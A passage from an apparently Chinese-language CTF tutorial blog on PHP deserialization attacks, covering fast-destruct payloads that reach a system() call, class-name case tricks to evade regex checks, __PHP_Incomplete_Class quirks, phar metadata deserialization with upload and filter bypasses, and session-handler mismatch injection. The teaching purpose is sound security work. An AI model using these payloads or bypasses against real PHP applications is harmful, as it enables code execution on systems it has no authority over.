php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$hello</span>=<span class="hljs-string">&quot;private&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$this</span>-&gt;hello);<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:4:&quot;test&quot;:1:&#123;s:5:&quot;hello&quot;;s:6:&quot;public&quot;;&#125;&#x27;</span>);<br><span class="hljs-comment">//string(6) &quot;public&quot;</span><br></code></pre></td></tr></table></figure><p>令<code>public</code>时得到的序列化字符串，在<code>priviate</code>或者<code>protected</code>修饰的时候反序列化，<code>hello</code>属性都能获得值</p><h2 id="类名和方法名不区分大小写"><a href="#类名和方法名不区分大小写" class="headerlink" title="类名和方法名不区分大小写"></a>类名和方法名不区分大小写</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">PHP特性：<br>变量名区分大小写<br>常量名区分大小写<br>数组索引 (键名) 区分大小写<br>函数名, 方法名, 类名不区分大小写<br>魔术常量不区分大小写 (以双下划线开头和结尾的常量)<br>NULL TRUE FALSE 不区分大小写<br>强制类型转换不区分大小写 (在变量前面加上 (type))<br></code></pre></td></tr></table></figure><p>常见用来绕过正则</p><p>如ctfshow的一道题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-12-04 23:52:24</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$cs</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable language_">$this</span>-&gt;password;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$ctfshowo</span>=@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$cs</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ctfshow/&#x27;</span>, <span class="hljs-variable">$cs</span>))&#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Error <span class="hljs-subst">$ctfshowo</span>&quot;</span>,<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="fast-destruct"><a href="#fast-destruct" class="headerlink" title="fast destruct"></a>fast destruct</h2><blockquote><p>通常发序列化的入口在__destruct()方法，如果在反序列化操作之后抛出了异常则会跳过__destruct()函数的执行。</p></blockquote><p>例如这样一道题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$args</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;args&#x27;</span>]);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;NoNoNo&quot;</span>);<br></code></pre></td></tr></table></figure><p>反序列化操作执行之后并没有立即执行<code>__destruct()</code>方法中的内容，而是抛出了异常导致<code>__destruct()</code>方法被跳过。但是我们可以修改序列化得到的字符串使得反序列化解析出错，导致<code>__destruct()</code>方法被提前执行。</p><p>正常情况下的序列化字符串应该是：</p><p><code>O:4:&quot;Test&quot;:1:&#123;s:4:&quot;args&quot;;s:6:&quot;whoami&quot;;&#125;</code></p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//去掉一个大括号</span><br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;args&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;whoami&quot;</span>;<br><br><span class="hljs-comment">//结尾加入多余数据</span><br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;args&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;whoami&quot;</span>;<span class="hljs-number">123</span>a&#125;<br></code></pre></td></tr></table></figure><h2 id="serialize-unserialize-x-x3D-x"><a href="#serialize-unserialize-x-x3D-x" class="headerlink" title="serialize(unserialize($x)) !&#x3D; $x"></a>serialize(unserialize($x)) !&#x3D; $x</h2><p>正常来说一个合法的反序列化字符串，在反序列化之后再次序列化所得到的结果应是一致的</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserializ/unserialize-14.png"></p><p>虽然在例子中没有AAA这个类，但是在反序列化 序列化过后得到的值依然为原来的值</p><p>var_dump的结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//class AAA&#123;</span><br><span class="hljs-comment">//    public $a = &#x27;1&#x27;;</span><br><span class="hljs-comment">//    public $b = &#x27;2&#x27;;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//$raw = &#x27;O:3:&quot;AAA&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;1&quot;;s:1:&quot;b&quot;;s:1:&quot;2&quot;;&#125;&#x27;;</span><br><span class="hljs-comment">//echo var_dump(unserialize($raw));</span><br><span class="hljs-keyword">object</span>(AAA)<span class="hljs-comment">#1 (2) &#123;</span><br>  [<span class="hljs-string">&quot;a&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>  [<span class="hljs-string">&quot;b&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;2&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//$raw = &#x27;O:3:&quot;AAA&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;1&quot;;s:1:&quot;b&quot;;s:1:&quot;2&quot;;&#125;&#x27;;</span><br><span class="hljs-comment">//echo var_dump(unserialize($raw));</span><br><span class="hljs-keyword">object</span>(<span class="hljs-built_in">__PHP_Incomplete_Class</span>)<span class="hljs-comment">#1 (3) &#123;</span><br>  [<span class="hljs-string">&quot;__PHP_Incomplete_Class_Name&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;AAA&quot;</span><br>  [<span class="hljs-string">&quot;a&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>  [<span class="hljs-string">&quot;b&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;2&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>var_dump后可以发现以下差异</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">1：所属类名称<br>对象所属类的名称由 AAA 变为了 __PHP__Incomplete_Class<br><br>2：__PHP_Incomplete_Class_Name 属性<br>__PHP_Incomplete_Class 对象中多包含了一个 __PHP_Incomplete_Class_Name 属性<br></code></pre></td></tr></table></figure><p>所以PHP在遇到不存在的类时，会把不存在的类转换成 __PHP_Incomplete_Class 这种特殊的类，并且将原始的类名存放在 __PHP_Incomplete_Class_Name 这个属性中。而 serialize() 在处理的时候会倒推回来，发现对象是 __PHP_Incomplete_Class 后，会序列化成 __PHP_Incomplete_Class_Name 的值为类名的类，<strong>同时将 __PHP_Incomplete_Class_Name 删除（属性个数减一）</strong></p><p>所以可以手动构造一个包含<code>__PHP__Incomplete_Class</code>的序列化字符串，因为是我们手动构造的，所以<code>__PHP_Incomplete_Class_Name</code>值为空，serialize找不到后会跳过，但是属性个数减一的步骤不会跳过，所以构成了<code>serialize(unserialize($x)) != $x</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserializ/unserialize-15.png"></p><blockquote><p>注意：若 __PHP_Incomplete_Class 对象中的属性个数为零，则 __PHP_Incomplete_Class 的序列化结果中的属性个数描述值也将为零</p></blockquote><h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><blockquote><p>众所周知，在利用反序列化漏洞的时候，一般是将序列化后的字符串传入<code>unserialize()</code>来利用。但是通过<code>phar</code>可以不依赖<code>unserialize()</code>直接进行反序列化操作</p></blockquote><p>Phar是PHP的压缩文档，是PHP中类似于JAR的一种打包文件。它可以把多个文件存放至同一个文件中，无需解压，PHP就可以进行访问并执行内部语句。在PHP 5.3或更高版本中默认开启</p><p>phar结构由4部分组成</p><p><strong>一：stub</strong></p><p>stub的基本结构：<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。类似于Phar的文件头</p><p><strong>二：manifest</strong></p><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这里就是漏洞利用的关键点</p><p><strong>三：contents</strong></p><p>被压缩文件的内容</p><p><strong>四：signature</strong></p><p>签名，放在文件末尾</p><p>签证尾部的01代表md5加密，02代表sha1加密，04代表sha256加密，08代表sha512加密</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserializ/unserialize-11.png"></p><p>一个最基本的例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;test.phar&quot;</span>);   <span class="hljs-comment">//后缀名必须为phar</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();  <span class="hljs-comment">//开始缓冲Phar写操作</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);   <span class="hljs-comment">//设置stub</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);  <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-comment">//签名自动计算</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>(); <span class="hljs-comment">//停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserializ/unserialize-12.png"></p><p>php一大部分的文件系统函数在通过phar:&#x2F;&#x2F;伪协议解析phar文件时，都会将meta-data进行反序列化<br>受影响的函数如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php">fileatime<br>filectime<br>file_exists<br>file_get_contents<br>file_put_contents<br>file<br>filegroup<br>fopen<br>fileinode<br>filemtime<br>fileowner<br>fileperms<br>is_dir<br>is_executable<br>is_file<br>is_link<br>is_readable<br>is_writable<br>is_writeable<br>parse_ini_file<br>copy<br>unlink<br>stat<br>readfile<br></code></pre></td></tr></table></figure><p>当我们修改文件的内容时，签名就会变得无效，这个时候需要重新计算签名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    f = file.read()<br>s = f[:-<span class="hljs-number">28</span>] <span class="hljs-comment"># 获取要签名的数据</span><br>h = f[-<span class="hljs-number">8</span>:] <span class="hljs-comment"># 获取签名类型和GBMB标识</span><br>newf = s + sha1(s).digest() + h <span class="hljs-comment"># 数据 + 签名 + (类型 + GBMB)</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;newtest.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(newf) <span class="hljs-comment"># 写入新文件</span><br></code></pre></td></tr></table></figure><h2 id="phar绕过上传限制"><a href="#phar绕过上传限制" class="headerlink" title="phar绕过上传限制"></a>phar绕过上传限制</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;test.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//添加任意的文件头</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserializ/unserialize-13.png"></p><h2 id="绕过头部phar-x2F-x2F"><a href="#绕过头部phar-x2F-x2F" class="headerlink" title="绕过头部phar:&#x2F;&#x2F;"></a>绕过头部phar:&#x2F;&#x2F;</h2><p>如果题目限制了<code>phar://</code>不能出现在头几个字符，可以用<code>Bzip/Gzip</code>协议绕过</p><p>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^php|^file|^phar|^dict|^zip/i&quot;</span>,<span class="hljs-variable">$filename</span>)&#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=phar://test.phar</span><br><span class="hljs-comment">//即使用filter伪协议来进行绕过</span><br><br>compress.bzip2:<span class="hljs-comment">//phar:///test.phar/test.txt</span><br><span class="hljs-comment">//使用bzip2协议来进行绕过</span><br><br>compress.zlib:<span class="hljs-comment">//phar:///home/sx/test.phar/test.txt</span><br><span class="hljs-comment">//使用zlib协议进行绕过</span><br></code></pre></td></tr></table></figure><h2 id="绕过-HALT-COMPILER检测"><a href="#绕过-HALT-COMPILER检测" class="headerlink" title="绕过__HALT_COMPILER检测"></a>绕过__HALT_COMPILER检测</h2><p>在前面介绍stub时提到过，PHP通过<code>__HALT_COMPILER</code>来识别Phar文件，那么为了防止Phar反序列化的出现，可能就会对这个进行过滤</p><p>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/HALT_COMPILER/i&quot;</span>,<span class="hljs-variable">$Phar</span>)&#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>绕过方法一：</strong></p><p>将Phar文件的内容写到压缩包注释中，压缩为zip文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();<br><span class="hljs-variable">$res</span> = <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&#x27;phar.zip&#x27;</span>,<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">CREATE</span>);<br><span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;flag is here&#x27;</span>);<br><span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">setArchiveComment</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>绕过方法二：</strong></p><p>将生成的Phar文件进行gzip压缩，压缩后同样也可以进行反序列化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gzip test.phar<br></code></pre></td></tr></table></figure><h1 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h1><p>什么是session这里就不描述了，网上有很多文章可以参考</p><p>先了解下<code>PHP session</code>不同引擎的存储机制</p><p><code>PHP session</code>的存储机制是由<code>session.serialize_handler</code>来定义引擎的，默认是以文件的方式存储，且存储的文件是由<code>sess_sessionid</code>来决定文件名的</p><p>session.serialize_handler定义的引擎共有三种：</p><table><thead><tr><th>处理器名称</th><th>存储格式</th></tr></thead><tbody><tr><td>php</td><td>键名 + 竖线 + 经过serialize()函数序列化处理的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值</td></tr><tr><td>php_serialize</td><td>经过serialize()函数序列化处理的数组</td></tr></tbody></table><p>当<code>php</code>和<code>php_serialize</code>这两个处理区混合起来使用，就会出现<code>session</code>反序列化漏洞。原因是<code>php_serialize</code>存储的反序列化字符可以引用<code>|</code>，如果这时候使用<code>php</code>处理器的格式取出<code>$_SESSION</code>的值，<code>|</code>会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞</p><h2 id="SESSION变量可控"><a href="#SESSION变量可控" class="headerlink" title="$_SESSION变量可控"></a>$_SESSION变量可控</h2><p>例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//1.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;session&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;session&#x27;</span>];<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><br><br><span class="hljs-comment">//2.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;name;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>先在<code>1.php</code>传入<code>?session=lewiserii</code></p><p><code>session</code>的内容，因为1.php页面用的是<code>php_serialize</code>引擎，所以是序列化处理的数组的形式</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-1.png"></p><p>而2.php用的是<code>php</code>引擎，在可控点传入<code>|</code>+<code>序列化字符串</code>，然后再次访问2.php调用session值的时候会触发</p><p>传入<code>?session=|O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:9:&quot;lewiserii&quot;;&#125;</code>后，文件中的值就变成了下图中的值</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-2.png"></p><p>再次访问2.php，发现成功反序列化，修改了<code>$name</code></p><p><img 